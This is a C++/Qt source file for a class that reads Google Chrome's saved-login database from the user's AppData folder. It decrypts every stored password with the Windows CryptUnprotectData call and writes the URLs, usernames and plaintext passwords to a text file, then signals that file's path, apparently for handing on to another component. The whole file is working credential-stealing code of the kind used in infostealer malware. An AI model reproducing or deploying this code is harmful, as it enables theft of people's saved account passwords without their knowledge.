#include "chromePass.h"

PassReader::PassReader(QObject* parent, const QString &str): QObject(parent), path(str)
{

}

PassReader::~PassReader()
{

}

bool PassReader::readPass()
{
    setlocale(LC_CTYPE, "rus");

    //Output file
    QString filePath = path + "/files/" + "chromePass.txt";
    QFile file(filePath);
    file.open(QIODevice::WriteOnly);

    //Open DB
    QSqlDatabase db;
    db = QSqlDatabase::addDatabase("QSQLITE");

    //Get %appdata% folder
    QString appdata = getenv("APPDATA");
    appdata.replace("\\", "/");

    //Destination folder
    db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");

    if (db.open())
    {
        //Create SQL Query, select url+login+pass
        QSqlQuery query;
        query.exec("SELECT origin_url, username_value, password_value FROM logins");

        while (query.next())
        {
            QString url = query.value(0).toString();
            QString user = query.value(1).toString();
            QByteArray pass = query.value(2).toByteArray();

            //Decrypt using Crypt32.lib
            DATA_BLOB DataIn;
            DATA_BLOB DataOut;
            DATA_BLOB* pDataIn = &DataIn;
            DATA_BLOB* pDataOut = &DataOut;

            DataIn.pbData = reinterpret_cast<byte*>( pass.data());  //Pointer to data_input             BYTE*
            DataIn.cbData = pass.size();                            //Size of input string (in bytes)   DWORD

            //Decrypt function
            //https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa380882(v=vs.85).aspx
            if (CryptUnprotectData( pDataIn,
                                    NULL,
                                    NULL,
                                    NULL,
                                    NULL,
                                    0,
                                    pDataOut))
            {
                QByteArray passDecrypted;
                unsigned long passSize  = static_cast<unsigned long>(DataOut.cbData);

                //Get pass string and cut (pbData doesn't have '\0')
                passDecrypted.append(reinterpret_cast<char*>(DataOut.pbData));
                passDecrypted.resize(passSize);

                qDebug() << endl << url << endl << "user = " << user << "\npass = " << QString(passDecrypted);

                //Stream for writing
                QTextStream stream(&file);
                stream << endl << url << "\r\nuser = " << user << "\r\npass = " << passDecrypted << "\r\n\r\n";
            }
            else
            {
                qDebug() << "Error. Cannot decrypt.";
                return false;
            }
        }
    }
    else
    {
        file.close();
        qDebug() << "Error. Cannot open DB.";
        return false;
    }

    file.close();
    emit passSaved(filePath);
    return true;
}
